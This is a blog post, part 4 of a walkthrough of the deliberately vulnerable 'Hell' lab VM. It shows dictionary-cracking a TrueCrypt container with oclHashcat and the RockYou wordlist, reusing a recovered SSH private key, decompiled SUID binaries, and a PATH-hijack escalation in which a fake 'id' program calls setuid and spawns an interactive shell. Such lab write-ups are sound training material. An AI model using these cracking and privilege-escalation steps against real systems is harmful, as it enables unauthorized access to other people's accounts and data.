
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>Hell Walkthrough - Part 4 - FourFourFourFour</title>
	<meta name="author" content="recrudesce">

	
	<meta name="description" content="Part 1 | Part 2 | Part 3 | Part 4 | Part 5 Yup, we&rsquo;re still going.  Told you it&rsquo;d be a long journey didn&rsquo;t I ? Tales from the Crypt &hellip;">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	
</head>


<body>
	<header id="header" class="inner"><h1><a href="/">FourFourFourFour</a></h1>
<nav id="main-nav"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:recrudesce.github.io">
			</form>
		</div>
	</div>
</nav>
<nav id="sub-nav" class="alignright">
	<div class="social">
		
		
		
		<a class="twitter" href="http://twitter.com/recrudesce" title="Twitter">Twitter</a>
		
		
    
		
		
		
		
		
		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
		
    
	</div>
	<form class="search" action="https://www.google.com/search" method="get">
		<input class="alignright" type="text" name="q" results="0">
		<input type="hidden" name="q" value="site:recrudesce.github.io">
	</form>
</nav>

</header>
	
		
	
	<div id="content" class="inner"><article class="post">
	<h2 class="title">Hell Walkthrough - Part 4</h2>
	<div class="entry-content"><p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | Part 4 | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>

<p>Yup, we&rsquo;re still going.  Told you it&rsquo;d be a long journey didn&rsquo;t I ?</p>

<h2>Tales from the Crypt, But First I&rsquo;ll Rock You</h2>

<p>George has one file in his home folder - a Truecrypt container.  I guess no one has told George that TrueCrypt isn&rsquo;t recommended any more - he should be using something else.  <em>shakes fist at the NSA</em></p>

<!-- more -->


<p>Mounting the TrueCrypt container requires us to know the container password, which we currently don&rsquo;t have.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~<span class="nv">$ </span>truecrypt --mount container.tc
</span><span class='line'>Enter mount directory <span class="o">[</span>default<span class="o">]</span>:
</span><span class='line'>Enter password <span class="k">for</span> /home/george/container.tc:
</span><span class='line'>Enter keyfile <span class="o">[</span>none<span class="o">]</span>:
</span><span class='line'>Protect hidden volume <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">(</span><span class="nv">y</span><span class="o">=</span>Yes/n<span class="o">=</span>No<span class="o">)</span> <span class="o">[</span>No<span class="o">]</span>:
</span><span class='line'>No password or keyfile specified.
</span></code></pre></td></tr></table></div></figure>


<p>Looking around a bit more, it looks like George has also signed up for RockYou</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>From: admin@rockyou.com
</span><span class='line'>To: super_admin@hell.com
</span><span class='line'>Subject: Account Activation
</span><span class='line'>Date: 13th November 2009
</span><span class='line'>
</span><span class='line'>Thanks <span class="k">for</span> signing up <span class="k">for</span> your account. I hope you enjoy our services.
</span></code></pre></td></tr></table></div></figure>


<p><em>ka-ching</em> George&rsquo;s password will be on the leaked RockYou wordlist.  oclHashCat can help us out here, thanks to the ability to use GPU&rsquo;s.  Yes, I&rsquo;m using a Windows PC for this, sue me.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>G:<span class="se">\D</span>ownloads<span class="se">\o</span>clHashcat-1.21&gt;oclHashcat64.exe -m <span class="m">6211</span> -a <span class="m">0</span> <span class="s2">&quot;g:\downloads\container.tc&quot;</span> g:<span class="se">\D</span>ownloads<span class="se">\d</span>ictionaries<span class="se">\c</span>atted<span class="se">\r</span>ockyou.txt
</span><span class='line'>
</span><span class='line'>g:<span class="se">\d</span>ownloads<span class="se">\c</span>ontainer.tc:letsyouupdateyourfunnotesandmore
</span><span class='line'>
</span><span class='line'>Session.Name...: oclHashcat
</span><span class='line'>Status.........: Cracked
</span><span class='line'>Input.Mode.....: File <span class="o">(</span>g:<span class="se">\D</span>ownloads<span class="se">\d</span>ictionaries<span class="se">\c</span>atted<span class="se">\r</span>ockyou.txt<span class="o">)</span>
</span><span class='line'>Hash.Target....: File <span class="o">(</span>g:<span class="se">\d</span>ownloads<span class="se">\c</span>ontainer.tc<span class="o">)</span>
</span><span class='line'>Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
</span><span class='line'>Time.Started...: Sat Jul <span class="m">12</span> 23:06:15 <span class="m">2014</span> <span class="o">(</span><span class="m">17</span> secs<span class="o">)</span>
</span><span class='line'>Speed.GPU.#1...:    <span class="m">29889</span> H/s
</span><span class='line'>Recovered......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Salts
</span><span class='line'>Progress.......: 496641/14343296 <span class="o">(</span>3.46%<span class="o">)</span>
</span><span class='line'>Skipped........: 0/496641 <span class="o">(</span>0.00%<span class="o">)</span>
</span><span class='line'>Rejected.......: 1/496641 <span class="o">(</span>0.00%<span class="o">)</span>
</span><span class='line'>HWMon.GPU.#1...: 97% Util, 56c Temp, 32% Fan
</span><span class='line'>
</span><span class='line'>Started: Sat Jul <span class="m">12</span> 23:06:15 2014
</span><span class='line'>Stopped: Sat Jul <span class="m">12</span> 23:06:37 2014
</span></code></pre></td></tr></table></div></figure>


<p>That didn&rsquo;t take too long now did it ?  But we have the TrueCrypt container password, which makes mounting it a tiny bit easier now.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~<span class="nv">$ </span>truecrypt --mount container.tc
</span><span class='line'>Enter mount directory <span class="o">[</span>default<span class="o">]</span>: ./tc
</span><span class='line'>Enter password <span class="k">for</span> /home/george/container.tc: letsyouupdateyourfunnotesandmore
</span><span class='line'>Enter keyfile <span class="o">[</span>none<span class="o">]</span>:
</span><span class='line'>Protect hidden volume <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">(</span><span class="nv">y</span><span class="o">=</span>Yes/n<span class="o">=</span>No<span class="o">)</span> <span class="o">[</span>No<span class="o">]</span>:
</span><span class='line'>
</span><span class='line'>george@hell:~<span class="nv">$ </span><span class="nb">cd </span>tc
</span><span class='line'>george@hell:~/tc<span class="nv">$ </span>ls -l
</span><span class='line'>total 2
</span><span class='line'>-rwx------ <span class="m">1</span> george george <span class="m">1679</span> Jul  <span class="m">5</span> 20:01 id_rsa
</span><span class='line'>george@hell:~/tc<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~/tc<span class="nv">$ </span>ssh bazza@127.0.0.1 -i ./id_rsa
</span><span class='line'>Linux hell 3.2.0-4-486 <span class="c">#1 Debian 3.2.57-3+deb7u2 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Jul <span class="m">13</span> 21:18:28 <span class="m">2014</span> from 192.168.0.102
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>bazza
</span></code></pre></td></tr></table></div></figure>


<p>Oh&hellip; I was expecting a bit more of a fight, but I guess Bazza trusts George, even though he uses defunct software that allows privilege escalation (look it up).  Fool.</p>

<h2>Bazza&rsquo;s Blockade</h2>

<p>Once again we&rsquo;re presented with 2 binaries, with SUID attributes set.  This time, however, we can read the files, which means we can decompile them.  Time to take a look</p>

<p>[c]int <em>_cdecl main()
{
  int result; // eax@6
  </em>BYTE v1[3]; // [sp+19h] [bp-417h]@3
  FILE <em>v2; // [sp+424h] [bp-Ch]@1
  const char </em>v3; // [sp+428h] [bp-8h]@1
  const char *v4; // [sp+42Ch] [bp-4h]@1</p>

<p>  v4 = &ldquo;900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2\n&rdquo;;
  v3 = &ldquo;1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id\n&rdquo;;
  printf(&ldquo;Checking integrity of part2&hellip;&rdquo;);
  v2 = popen(&ldquo;sha256sum /home/bazza/part2&rdquo;, &ldquo;r&rdquo;);
  if ( !v2 )
    puts(&ldquo;Failed to run command&rdquo;);
  fgets(v1, 1034, v2);
  if ( strcmp(v1, v4) )
  {
    puts(&ldquo;Uh oh&hellip;. Corrupted or in wrong directory (/home/bazza/)\n&rdquo;);
    result = 0;
  }
  else
  {
    puts(&ldquo; Done!!\n&rdquo;);
    printf(&ldquo;Checking integrity of calling target&hellip;&rdquo;);
    v2 = popen(&ldquo;sha256sum /usr/bin/id&rdquo;, &ldquo;r&rdquo;);
    if ( !v2 )
      puts(&ldquo;Failed to run command&rdquo;);
    fgets(v1, 1034, v2);
    if ( strcmp(v1, v3) )
    {
      puts(&ldquo;Target corrupt\n&rdquo;);
      result = 0;
    }
    else
    {
      puts(&ldquo; Done!!\n\nBinary and target confirmed.&rdquo;);
      system(&ldquo;/home/bazza/part2&rdquo;);
      pclose(v2);
      result = 0;
    }
  }
  return result;
}</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>OK, so part1 runs part2 <span class="o">(</span>this <span class="nb">time </span>with an absolute path<span class="o">)</span>, so <span class="nb">time </span><span class="k">for</span> a quick peek into part2
</span><span class='line'>
</span><span class='line'><span class="o">[</span>c<span class="o">]</span>int __cdecl main<span class="o">()</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>  __gid_t v0<span class="p">;</span> // eax@2
</span><span class='line'>  int result<span class="p">;</span> // eax@2
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span> getegid<span class="o">()</span> <span class="o">==</span> <span class="m">1003</span> <span class="o">)</span>
</span><span class='line'>  <span class="o">{</span>
</span><span class='line'>    puts<span class="o">(</span><span class="s2">&quot;\nCan&#39;t touch this *nah na na na na naaaaaaaa nah*&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    system<span class="o">(</span><span class="s2">&quot;id&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">result</span> <span class="o">=</span> 0<span class="p">;</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="o">{</span>
</span><span class='line'>    <span class="nv">v0</span> <span class="o">=</span> getegid<span class="o">()</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;\n\nError! %d ID detected ... you&#39;re not allowed to run this, please use part 1!\n&quot;</span>, v0<span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">result</span> <span class="o">=</span> 0<span class="p">;</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  <span class="k">return</span> result<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, part2 will run only if the effective group identifier is 1003.  part1 has a SUID attribute set as group developers, which means you have to run part1 before part2.  If you run part2 first, this happens</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Error! <span class="m">1004</span> ID detected ... you<span class="err">&#39;</span>re not allowed to run this, please use part 1!
</span></code></pre></td></tr></table></div></figure>


<p>Running part1 changes our effective group identifier, and part2 changes our effective user identifier, but doesn&rsquo;t seem to drop us to a shell as that user (oj)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./part1
</span><span class='line'>Checking integrity of part2... Done!!
</span><span class='line'>
</span><span class='line'>Checking integrity of calling target... Done!!
</span><span class='line'>
</span><span class='line'>Binary and target confirmed.
</span><span class='line'>
</span><span class='line'>Can<span class="err">&#39;</span>t touch this *nah na na na na naaaaaaaa nah*
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1003<span class="o">(</span>developers<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span>,1004<span class="o">(</span>bazza<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>bazza
</span></code></pre></td></tr></table></div></figure>


<p>A further look into the source code for part2 shows that it is not using an absolute path for the system(&ldquo;id&rdquo;) function, therefore we can trick this application into running a bogus id binary in the same way we did with the bogus chmod binary.  The source code is pretty much the same, apart from the fact I&rsquo;m using uid 1005 rather than 1000.</p>

<p>[c]#include &lt;stdio.h></p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main()
{
 setuid( 1005 );
 system(&ldquo;/usr/bin/id&rdquo;);
 system( &ldquo;/bin/sh -i&rdquo; );
}</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>This is compiled, placed in /tmp and made executable.  The path environment variable is modified as per last <span class="nb">time </span>and we<span class="err">&#39;</span>re good to go.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ ./part1
Checking integrity of part2&hellip; Done!!</p>

<p>Checking integrity of calling target&hellip; Done!!</p>

<p>Binary and target confirmed.</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
oj</p>

<p>&#8220;`</p>

<p>Success !</p>

<p>Nearly there, only this hoop to jump through and we&rsquo;re done.  I figured this&rsquo;d be a 5 parter, now I know it is going to be.</p>
</div>


<div class="meta">
	<div class="date">








  


<time datetime="2014-07-20T19:46:02+01:00" pubdate data-updated="true"></time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>


</div>
	
</div>
</article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
		
		
		<a class="addthis_button_tweet"></a>
		
		
		
	</div>
	
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2015

    recrudesce

</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>